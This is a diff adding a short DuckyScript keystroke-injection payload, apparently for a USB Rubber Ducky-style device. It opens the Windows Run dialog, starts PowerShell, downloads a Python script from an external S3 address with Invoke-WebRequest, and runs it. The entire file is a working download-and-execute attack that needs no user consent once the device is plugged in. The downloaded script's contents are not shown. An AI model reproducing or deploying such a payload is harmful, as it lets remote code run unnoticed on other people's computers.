@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri https://ilefa-cdn.s3.amazonaws.com/Q1C.py -OutFile Q1C.py
+DELAY 1000
+ENTER
+DELAY 1000
+STRING python3 Q1C.py
+DELAY 1000
+ENTER
